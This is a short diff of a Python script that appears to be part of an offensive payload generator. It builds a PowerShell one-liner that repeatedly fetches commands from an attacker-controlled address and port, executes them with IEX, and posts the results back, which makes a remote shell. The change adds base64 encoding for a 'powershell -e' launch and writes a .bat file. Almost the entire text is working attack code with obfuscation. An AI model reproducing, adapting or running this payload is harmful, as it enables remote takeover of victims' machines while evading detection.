@@ -5,11 +5,10 @@ PORT = 8000
 
 GREEN = '\033[38;5;47m'; END = '\033[0m'
 
-payload = f"& {{while ($true){{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}').Content;$r=Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}' -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($c) -join ' ')}}}}"
-print(f"{GREEN}TESTE- RAWPAYLOAD:{END}")
-print("")
-print("powershell -W hidden {" +payload+"}")
-print("")
+payload = f"& {{while ($true) {{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}').Content;$r=Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}' -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($c) -join ' ')}}}}"
+e_payload = base64.b64encode(payload.encode('utf-16le')).decode('utf-8')
+print(f"{GREEN}PAYLOAD:{END}")
+print (f"powershell -e {e_payload}")
 
 print(f"{GREEN}TESTE- PAYLOAD .bat created {END}")
 print("")
